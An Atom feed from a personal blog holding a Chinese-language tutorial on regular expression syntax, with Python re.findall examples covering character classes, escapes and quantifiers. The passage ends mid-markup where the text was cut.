<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>HackerLee</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://muzibing.github.io/"/>
  <updated>2020-09-17T12:30:42.830Z</updated>
  <id>https://muzibing.github.io/</id>
  
  <author>
    <name>MUZIBing</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>正则表达式学习总结</title>
    <link href="https://muzibing.github.io/2020/09/17/2020.09.17%EF%BC%88153%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/09/17/2020.09.17（153）/</id>
    <published>2020-09-16T16:00:00.000Z</published>
    <updated>2020-09-17T12:30:42.830Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-正则表达式"><a class="markdownIt-Anchor" href="#0x00-正则表达式"></a> 0x00 正则表达式</h3><h4 id="1为什么使用正则表达式"><a class="markdownIt-Anchor" href="#1为什么使用正则表达式"></a> 1.为什么使用正则表达式？</h4><blockquote><p>典型的搜索和替换操作要求您提供与预期的搜索结果匹配的确切文本。虽然这种技术对于对静态文本执行简单搜索和替换任务可能已经足够了，但它缺乏灵活性，若采用这种方法搜索动态文本，即使不是不可能，至少也会变得很困难。</p></blockquote><p>通过使用正则表达式，可以：</p><ul><li>测试字符串内的模式。<br>例如，可以测试输入字符串，以查看字符串内是否出现电话号码模式或信用卡号码模式。这称为数据验证。</li><li>替换文本。<br>可以使用正则表达式来识别文档中的特定文本，完全删除该文本或者用其他文本替换它。</li><li>基于模式匹配从字符串中提取子字符串。<br>可以查找文档内或输入域内特定的文本。</li></ul><blockquote><p>例如，您可能需要搜索整个网站，删除过时的材料，以及替换某些 HTML 格式标记。在这种情况下，可以使用正则表达式来确定在每个文件中是否出现该材料或该 HTML 格式标记。此过程将受影响的文件列表缩小到包含需要删除或更改的材料的那些文件。然后可以使用正则表达式来删除过时的材料。最后，可以使用正则表达式来搜索和替换标记。</p></blockquote><h3 id="0x01-语法"><a class="markdownIt-Anchor" href="#0x01-语法"></a> 0x01 语法</h3><blockquote><p>正则表达式(regular expression)描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等。</p></blockquote><h4 id="1普通字符"><a class="markdownIt-Anchor" href="#1普通字符"></a> 1.普通字符</h4><p><code>[ABC]</code></p><blockquote><p>匹配 <strong>[…]</strong> 中的所有字符，例如 <strong>[aeiou]</strong> 匹配字符串 “google runoob taobao” 中所有的 e o u a 字母。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"abcdef1234"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"[safc]"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'a'</span>, <span class="string">'c'</span>, <span class="string">'f'</span>]</span><br></pre></td></tr></table></figure><p><code>[^ABC]</code></p><blockquote><p>匹配除了 <strong>[…]</strong> 中字符的所有字符，例如 <strong>[^aeiou]</strong> 匹配字符串 “google runoob taobao” 中除了 e o u a 字母的所有字母。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"abcdef1234"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"[^safc]"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'b'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>]</span><br></pre></td></tr></table></figure><p><code>[A-Z]</code></p><blockquote><p>[A-Z] 表示一个区间，匹配所有大写字母，[a-z] 表示所有小写字母。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"abcdef1234"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"[A-Z]"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[]</span><br></pre></td></tr></table></figure><p><code>[a-zA-Z]</code></p><blockquote><p>匹配所有大、小写字母</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"abcdef1234"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"[a-zA-Z]"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>]</span><br></pre></td></tr></table></figure><p><code>[a-zA-Z0-9]</code></p><blockquote><p>匹配所有大、小写字母以及数字</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"abcdef1234"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"[a-zA-Z0-9]"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>]</span><br></pre></td></tr></table></figure><p><code>.</code></p><blockquote><p>匹配除换行符（\n、\r）之外的任何单个字符，相等于 <code>[^\n\r]</code>。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = r<span class="string">"abcdef\n12\r34"</span><span class="comment"># 加上r' '相当于对字符串的原始字符，相当于\n没有被转义</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"."</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'\\'</span>, <span class="string">'n'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'\\'</span>, <span class="string">'r'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; s = <span class="string">"abcdef\n12\r34"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"."</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'\r'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>]</span><br></pre></td></tr></table></figure><p><code>[\s\S]</code></p><blockquote><p>匹配所有。\s 是匹配所有空白符，包括换行，\S 非空白符，包括换行。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"abcdef\n12\r   34"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"\s"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'\n'</span>, <span class="string">'\r'</span>, <span class="string">' '</span>, <span class="string">' '</span>, <span class="string">' '</span>]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"\S"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>]</span><br></pre></td></tr></table></figure><p><code>[\w\W]</code></p><blockquote><p><code>\w</code>匹配字母、数字、下划线。等价于 <code>[A-Za-z0-9_]</code>，<code>[\W]</code>相当于<code>[^A-Za-z0-9_]</code></p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"abcdef\n12\r   34"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"\w"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"\W"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'\n'</span>, <span class="string">'\r'</span>, <span class="string">' '</span>, <span class="string">' '</span>, <span class="string">' '</span>]</span><br></pre></td></tr></table></figure><h4 id="2非打印字符"><a class="markdownIt-Anchor" href="#2非打印字符"></a> 2.非打印字符</h4><blockquote><p>非打印字符也可以是正则表达式的组成部分。下表列出了表示非打印字符的转义序列</p></blockquote><p><code>\cx</code></p><blockquote><p>匹配由x指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符</p></blockquote><table><thead><tr><th>字符</th><th>描述</th></tr></thead><tbody><tr><td>\cx</td><td>匹配由x指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。<br>x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。</td></tr><tr><td>\f</td><td>匹配一个换页符。等价于 \x0c 和 \cL。</td></tr><tr><td>\n</td><td>匹配一个换行符。等价于 \x0a 和 \cJ。</td></tr><tr><td>\r</td><td>匹配一个回车符。等价于 \x0d 和 \cM。</td></tr><tr><td>\s</td><td>匹配任何空白字符，包括空格、制表符、换页符等等。<br>等价于 [ \f\n\r\t\v]。注意 Unicode 正则表达式会匹配全角空格符。</td></tr><tr><td>\S</td><td>匹配任何非空白字符。等价于<code>[^ \f\n\r\t\v]</code>。</td></tr><tr><td>\t</td><td>匹配一个制表符。等价于 \x09 和 \cI。</td></tr><tr><td>\v</td><td>匹配一个垂直制表符。等价于 \x0b 和 \cK。</td></tr></tbody></table><h4 id="3特殊字符"><a class="markdownIt-Anchor" href="#3特殊字符"></a> 3.特殊字符</h4><blockquote><p>所谓特殊字符，就是一些有特殊含义的字符，如上面说的 <strong>runoo*b</strong> 中的 *****，简单的说就是表示任何字符串的意思。如果要查找字符串中的 ***** 符号，则需要对 ***** 进行转义，即在其前加一个 ****: <strong>runo*ob</strong> 匹配 runo*ob。</p><p>许多元字符要求在试图匹配它们时特别对待。若要匹配这些特殊字符，必须首先使字符&quot;转义&quot;，即，将反斜杠字符**** 放在它们前面。下表列出了正则表达式中的特殊字符：</p></blockquote><p><code>$</code></p><blockquote><p>匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 ​$ 字符本身，请使用 $</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"abcdef\n12\r34\n"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"$"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">''</span>, <span class="string">''</span>]</span><br></pre></td></tr></table></figure><p><code>( )</code></p><blockquote><p>标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 ( 和 )</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"root@()"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">''</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"root@(.)"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'1'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"root@(.+)"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'192.168.132.1'</span>]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; re.search(r,s).group()</span><br><span class="line"><span class="string">'root@192.168.132.1'</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"root@(\w)"</span>)</span><br><span class="line">&gt;&gt;&gt; re.search(r,s).group()</span><br><span class="line"><span class="string">'root@1'</span></span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'1'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"root@(\w+)"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'192'</span>]</span><br></pre></td></tr></table></figure><p><code>*</code>：0次或多次</p><blockquote><p>匹配前面的子表达式<strong>零次</strong>或<strong>多次</strong>。要匹配 * 字符，请使用 *。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"root@www.baidu.com"</span></span><br><span class="line">&gt;&gt;&gt; s2 = <span class="string">"root@baidu.com"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"\w+@(\w*.+)"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'www.baidu.com'</span>]</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s2)</span><br><span class="line">[<span class="string">'baidu.com'</span>]</span><br></pre></td></tr></table></figure><p><code>+</code>：1次或多次</p><blockquote><p>匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 +。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"root@www.baidu.com"</span></span><br><span class="line">&gt;&gt;&gt; s2 = <span class="string">"root@baidu.com"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"\w+@(\w*.+)"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'www.baidu.com'</span>]</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s2)</span><br><span class="line">[<span class="string">'baidu.com'</span>]</span><br></pre></td></tr></table></figure><p><code>?</code>：子表达式的0次或1次</p><blockquote><p>匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 \?。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"root@www.baidu.com"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"@(\w)"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'w'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"@(\w)+"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'w'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"@(\w+)"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'www'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"@(\w?)"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'w'</span>]</span><br></pre></td></tr></table></figure><p><code>.</code></p><blockquote><p>匹配除换行符 \n 之外的任何单字符。要匹配 . ，请使用 \. 。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"root@www.baidu.com"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"."</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'r'</span>, <span class="string">'o'</span>, <span class="string">'o'</span>, <span class="string">'t'</span>, <span class="string">'@'</span>, <span class="string">'w'</span>, <span class="string">'w'</span>, <span class="string">'w'</span>, <span class="string">'.'</span>, <span class="string">'b'</span>, <span class="string">'a'</span>, <span class="string">'i'</span>, <span class="string">'d'</span>, <span class="string">'u'</span>, <span class="string">'.'</span>, <span class="string">'c'</span>, <span class="string">'o'</span>, <span class="string">'m'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"root(.)"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'@'</span>]</span><br></pre></td></tr></table></figure><p><code>[</code></p><blockquote><p>标记一个中括号表达式的开始。要匹配 [，请使用 \[。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"root@www.baidu.com"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"[@]"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'@'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"[\w+]"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'r'</span>, <span class="string">'o'</span>, <span class="string">'o'</span>, <span class="string">'t'</span>, <span class="string">'w'</span>, <span class="string">'w'</span>, <span class="string">'w'</span>, <span class="string">'b'</span>, <span class="string">'a'</span>, <span class="string">'i'</span>, <span class="string">'d'</span>, <span class="string">'u'</span>, <span class="string">'c'</span>, <span class="string">'o'</span>, <span class="string">'m'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"[\w]"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'r'</span>, <span class="string">'o'</span>, <span class="string">'o'</span>, <span class="string">'t'</span>, <span class="string">'w'</span>, <span class="string">'w'</span>, <span class="string">'w'</span>, <span class="string">'b'</span>, <span class="string">'a'</span>, <span class="string">'i'</span>, <span class="string">'d'</span>, <span class="string">'u'</span>, <span class="string">'c'</span>, <span class="string">'o'</span>, <span class="string">'m'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"[\W]"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'@'</span>, <span class="string">'.'</span>, <span class="string">'.'</span>]</span><br></pre></td></tr></table></figure><p><code>\</code></p><blockquote><p>将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。’\n’ 匹配换行符。序列 ‘\’ 匹配 “”，而 ‘(’ 则匹配 “(”。</p></blockquote><p><code>^</code></p><blockquote><p>匹配输入字符串的开始位置，除非在方括号表达式中使用，当该符号在方括号表达式中使用时，表示不接受该方括号表达式中的字符集合。要匹配 ^ 字符本身，请使用 \^。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"root@www.baidu.com"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"^"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">''</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"[^\w]"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'@'</span>, <span class="string">'.'</span>, <span class="string">'.'</span>]</span><br></pre></td></tr></table></figure><p><code>{</code></p><blockquote><p>标记限定符表达式的开始。要匹配 {，请使用 \{。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"root@www.baidu.com"</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"\w"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'r'</span>, <span class="string">'o'</span>, <span class="string">'o'</span>, <span class="string">'t'</span>, <span class="string">'w'</span>, <span class="string">'w'</span>, <span class="string">'w'</span>, <span class="string">'b'</span>, <span class="string">'a'</span>, <span class="string">'i'</span>, <span class="string">'d'</span>, <span class="string">'u'</span>, <span class="string">'c'</span>, <span class="string">'o'</span>, <span class="string">'m'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"\w&#123;3&#125;"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'roo'</span>, <span class="string">'www'</span>, <span class="string">'bai'</span>, <span class="string">'com'</span>]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"(\w+)@&#123;3&#125;"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"[^\w]"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'@'</span>, <span class="string">'.'</span>, <span class="string">'.'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"[^\w]&#123;3&#125;"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"(\w+)@"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'root'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"(\w+)&#123;3&#125;@"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'t'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"(\w+)&#123;0,3&#125;@"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'root'</span>]</span><br></pre></td></tr></table></figure><p><code>|</code></p><blockquote><p>指明两项之间的一个选择。要匹配 |，请使用 \|。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"root@www.baidu.com"</span></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"@|#"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'@'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"@|root@"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'root@'</span>]</span><br></pre></td></tr></table></figure><h4 id="4限定符"><a class="markdownIt-Anchor" href="#4限定符"></a> 4.限定符</h4><p>限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 ***** 或 <strong>+</strong> 或 <strong>?</strong> 或 <strong>{n}</strong> 或 <strong>{n,}</strong> 或 <strong>{n,m}</strong> 共6种。</p><p>正则表达式的限定符有：</p><table><thead><tr><th>字符</th><th>描述</th></tr></thead><tbody><tr><td>*</td><td>匹配前面的子表达式<strong>零次</strong>或<strong>多次</strong>。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。</td></tr><tr><td>+</td><td>匹配前面的子表达式<strong>一次</strong>或<strong>多次</strong>。例如，‘zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</td></tr><tr><td>?</td><td>匹配前面的子表达式<strong>零次</strong>或<strong>一次</strong>。例如，“do(es)?” 可以匹配 “do” 、 “does” 中的 “does” 、 “doxy” 中的 “do” 。? 等价于 {0,1}。</td></tr><tr><td>{n}</td><td>n 是一个非负整数。匹配确定的 n 次。例如，‘o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</td></tr><tr><td>{n,}</td><td>n 是一个非负整数。至少匹配n 次。例如，‘o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。‘o{1,}’ 等价于 ‘o+’。‘o{0,}’ 则等价于 ‘o*’。</td></tr><tr><td>{n,m}</td><td>m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，“o{1,3}” 将匹配 “fooooood” 中的前三个 o。‘o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</td></tr></tbody></table><p><code>/[1-9][0-9]*/</code></p><blockquote><p><strong>[1-9]<strong>设置第一个数字不是 0，</strong>[0-9]*</strong> 表示任意多个数字。请注意，限定符出现在范围表达式之后。因此，它应用于整个范围表达式，在本例中，只指定从 0 到 9 的数字（包括 0 和 9）。这里不使用 + 限定符，因为在第二个位置或后面的位置不一定需要有一个数字。也不使用 ? 字符，因为使用 ? 会将整数限制到只有两位数。如果你想设置 0~99 的两位数，可以使用下面的表达式来至少指定一位但至多两位数字。</p></blockquote><p><code>/[0-9]{1,2}/</code></p><p>上面的表达式的缺点是，只能匹配两位数字，而且可以匹配 0、00、01、10 99 的章节编号仍只匹配开头两位数字。</p><p>改进下，匹配 1~99 的正整数表达式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/[1-9][0-9]?/</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 